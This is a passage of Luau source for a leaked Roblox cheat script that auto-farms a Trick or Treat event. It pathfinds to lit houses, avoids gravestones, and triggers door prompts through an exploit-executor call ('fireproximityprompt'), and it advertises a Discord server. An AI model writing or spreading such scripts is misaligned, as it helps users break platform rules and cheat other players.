  M.Phase="Paused: enter Trick or Treat streets"; return
 end
 areaPaused=false
 if RS:GetAttribute("TrickOrTreat2026Event")~=true then
  clearRoute(); removeBeeMovers(); brake(); M.Phase="Waiting for Trick or Treat event"; return
 end
 if not M.Enabled then
  if wasAuto then removeBeeMovers(); brake(); wasAuto=false end
  if M.Manual then
   local tool=equip(h)
   if not tool then return end
   local d=flat(h.MoveDirection)
   if d.Magnitude>0.01 then
    drive(r, h, d.Unit)
   else
    removeBeeMovers(); brake()
   end
  end
  return
 end
 if os.clock()>=scanAt then
  scanAt=os.clock()+0.25; litCount=0; refreshArea()
  for _,p in houses() do
   local id=p:GetAttribute("HouseId")
   local lit=p:GetAttribute("LightsOn")==true
   if lit and lightState[id]==false then visited[id]=nil; deferredUntil[id]=nil end
   lightState[id]=lit
   if available(p) then litCount+=1 end
  end
  for id,record in dropCache do if os.clock()-record.at>90 then dropCache[id]=nil end end
 end
 wasAuto=true
 local tool=equip(h)
 if not tool then M.Phase="Flying gear missing ("..gearLabel()..")"; removeBeeMovers(); brake(); return end
 if not target then
  target=choose(r)
  if not target then M.Phase="Waiting for lit houses"; removeBeeMovers(); brake(); return end
  M.Phase="Travelling"; travelStart=os.clock(); targetFailures=0
  clearRoute()
 end
 if not target.Parent then clearRoute(); target=nil; removeBeeMovers(); brake(); return end
 if os.clock()<settleUntil then removeBeeMovers(); brake(); return end
 local returningToVisit=false
 if visit then
  removeBeeMovers(); brake(); h.Jump=false
  if nativeDrops then
   for id,record in nativeDrops do
    if typeof(record.SpawnPosition)=="Vector3" and type(record.SpawnTime)=="number"
      and record.SpawnTime>=visit.serverStarted-0.1
      and (record.SpawnPosition-visit.house.Position).Magnitude<=35 then
     local tracked=nearbyDrops[id]
     if not tracked and not visit.resolved[id] then
      tracked={position=record.Position,native=true}
      nearbyDrops[id]=tracked; visit.sawDrop=true
     end
     if record.Claimed and not visit.resolved[id] then
      visit.resolved[id]=true; nearbyDrops[id]=nil
      if record.ClaimPlayer==player then
       visit.claimed=(visit.claimed or 0)+(record.ClaimAmount or 1)
       visit.claimAt=os.clock()
      else visit.lostDrops=true end
     end
    end
   end
   for id,record in nearbyDrops do
    if record.native and nativeDrops[id]==nil then nearbyDrops[id]=nil end
   end
  end
  local balance=candyBalance()
  M.Candy=balance
  if target:GetAttribute("DoorOpen")==true or target:GetAttribute("LightsOn")==false then
   if not visit.houseResponded then visit.respondedAt=os.clock() end
   visit.houseResponded=true
  end
  if balance and balanceBefore and balance>balanceBefore then
   if visit.lastBalance~=balance then visit.lastCreditChange=os.clock(); visit.lastBalance=balance end
   if visit.claimAt or visit.directAt or visit.houseResponded then
    creditAt=creditAt or os.clock()
   end
  end
  if creditAt and next(nearbyDrops)==nil
    and os.clock()-math.max(creditAt,visit.claimAt or visit.directAt or creditAt,
      visit.lastCreditChange or creditAt)>=0.45 then
   M.Visits+=1
   table.insert(M.Log,{house=target:GetAttribute("HouseId"),seconds=os.clock()-ringTime,result="Candy",before=balanceBefore,after=balance})
   visited[target:GetAttribute("HouseId")]=true
   visit=nil
   clearRoute(); lastAngle=angle(target.Position); target=nil; M.Phase="Candy collected"; return
  end
  local pending=next(nearbyDrops)~=nil
  local noCredit=balance and balanceBefore and balance<=balanceBefore
  if noCredit and not pending and target:GetAttribute("LightsOn")==true
    and target:GetAttribute("DoorOpen")~=true
    and os.clock()-visit.lastRing>=3 and visit.attempts<3 then
   local doorPrompt=target:FindFirstChildWhichIsA("ProximityPrompt")
   if doorPrompt and doorPrompt.Enabled and (r.Position-target.Position).Magnitude<=6 then
    visit.lastRing=os.clock(); visit.attempts+=1
    fireproximityprompt(doorPrompt)
   end
  end
  local closed=target:GetAttribute("DoorOpen")~=true
  local endedWithoutCredit=noCredit and closed and target:GetAttribute("LightsOn")==false
    and visit.respondedAt and os.clock()-visit.respondedAt>=6
  local retriesFailed=noCredit and closed and visit.attempts>=3
    and os.clock()-visit.lastRing>=6
  local requestExpired=noCredit and os.clock()-ringTime>=20
  if not pending and (endedWithoutCredit or retriesFailed or requestExpired) then
   local id=target:GetAttribute("HouseId")
   table.insert(M.Log,{house=id,result="Unconfirmed; retry later",seconds=os.clock()-ringTime,
     before=balanceBefore,after=balance})
   deferredUntil[id]=os.clock()+20
   visit=nil; nearbyDrops={}; creditAt=nil; target=nil
   clearRoute(); removeBeeMovers(); brake(); M.Phase="House finished without credit; retry later"; return
  end
  M.WaitSeconds=math.floor(os.clock()-ringTime)
  if flat(r.Position-target.Position).Magnitude>7 or (r.Position-target.Position).Magnitude>10 then
   visit.returning=true
  elseif flat(r.Position-target.Position).Magnitude<=4 and (r.Position-target.Position).Magnitude<=6 then
   visit.returning=false
  end
  if visit.returning then
   returningToVisit=true; M.Phase="Returning to same door"
  else
   M.Phase="Waiting"; return
  end
 end
 if not returningToVisit and not available(target) then clearRoute(); target=nil; removeBeeMovers(); brake(); return end
 local prompt=target:FindFirstChildWhichIsA("ProximityPrompt")
 if not returningToVisit and flat(r.Position-target.Position).Magnitude<=4
   and (r.Position-target.Position).Magnitude<=math.min(6,prompt.MaxActivationDistance-1) then
  clearRoute(); removeBeeMovers(); brake(); h.Jump=false
  balanceBefore=candyBalance()
  if balanceBefore==nil then
   M.Phase="Waiting for candy data"; clearRoute(); removeBeeMovers(); brake(); return
  end
  nearbyDrops={}; creditAt=nil; lastClaimAt=nil
  reward=false; ringTime=os.clock(); M.Phase="Waiting"
  visit={house=target,started=ringTime,serverStarted=workspace:GetServerTimeNow(),before=balanceBefore,resolved={},lastRing=ringTime,attempts=1}
  M.WaitSeconds=0
  fireproximityprompt(prompt)
  return
 end
 if os.clock()-travelStart>40 then
  clearRoute(); travelStart=os.clock(); nextPlan=os.clock()+0.5
  removeBeeMovers(); brake(); M.Phase="Retrying same house"; return
 end
 if not route then plan(r); removeBeeMovers(); brake(); return end
 local point=route[routeIndex]
 local reach=math.max(3,SPEED*math.min(dt,0.05)*1.1)
 for _=1,12 do
  if not point then break end
  local distance=flat(point.Position-r.Position).Magnitude
  local previous=route[routeIndex-1]
  local crossed=false
  if previous then
   local segment=flat(point.Position-previous.Position)
   if segment.Magnitude>0.1 then
    local relative=flat(r.Position-point.Position)
    local lateral=(relative-segment.Unit*relative:Dot(segment.Unit)).Magnitude
    crossed=relative:Dot(segment.Unit)>=0 and lateral<=4
   end
  end
  local footY=r.Position.Y-h.HipHeight-r.Size.Y/2
  if routeIndex<#route and (distance<=reach or crossed) and math.abs(footY-point.Position.Y)<4 then
   routeIndex+=1; point=route[routeIndex]
  else break end
 end
 if not point then
  clearRoute(); nextPlan=os.clock()+0.3; removeBeeMovers(); brake(); return
 end
 local delta=flat(point.Position-r.Position)
 local distanceToWaypoint=delta.Magnitude
 if progressWaypoint~=routeIndex then
  progressWaypoint=routeIndex; bestWaypointDistance=distanceToWaypoint; progressAt=os.clock()
 elseif not bestWaypointDistance or distanceToWaypoint<bestWaypointDistance-1.5 then
  bestWaypointDistance=distanceToWaypoint; progressAt=os.clock()
 elseif os.clock()-progressAt>1.5 then
  recover(r,"Stuck; routing around obstacle",true); return
 end
 if os.clock()>=obstacleAt and distanceToWaypoint>0.2
    and flat(target.Position-r.Position).Magnitude>22 then
  obstacleAt=os.clock()+0.15
  local direction=delta.Unit
  local side=Vector3.new(-direction.Z,0,direction.X)
  local params=collisionParams()
  for _,offset in {-1.8,0,1.8} do
   local origin=r.Position+side*offset-Vector3.new(0,0.6,0)
   local hit=workspace:Raycast(origin,direction*9,params)
   if hit then
    local parent=hit.Instance
    local grave=false
    for _=1,5 do
     if not parent then break end
     local name=string.lower(parent.Name)
     if string.find(name,"grave") or string.find(name,"tomb") then grave=true; break end
     parent=parent.Parent
    end
    if grave then recover(r,"Gravestone ahead; taking detour",true); return end
   end
  end
 end
 if delta.Magnitude<0.15 then
  removeBeeMovers(); brake(); h.Jump=false; return
 end
 if point.Action==Enum.PathWaypointAction.Jump and lastJumpIndex~=routeIndex then
  h.Jump=true; lastJumpIndex=routeIndex
 end
 drive(r,h,delta.Unit)
 end)
 if not ok then M.Enabled=false; M.Phase="Error: "..tostring(err); removeBeeMovers(); brake(); toggle.Text="START • retry" end
 if os.clock()>uiAt then
  uiAt=os.clock()+0.2
  status.Text=M.Phase..(target and (" • House "..tostring(target:GetAttribute("HouseId"))) or "")..(M.Phase=="Waiting" and (" • "..tostring(M.WaitSeconds or 0).."s") or "").."\nCorn: "..tostring(candyBalance() or "?").." • Visits: "..M.Visits.." • "..SPEED.." speed\nGear: "..gearLabel().." • leaked by 212 • discord.gg/noxhub"
 end
end)
return "Auto Trick or Treat leaked by 212 | discord.gg/noxhub loaded (gear selector); auto starts OFF"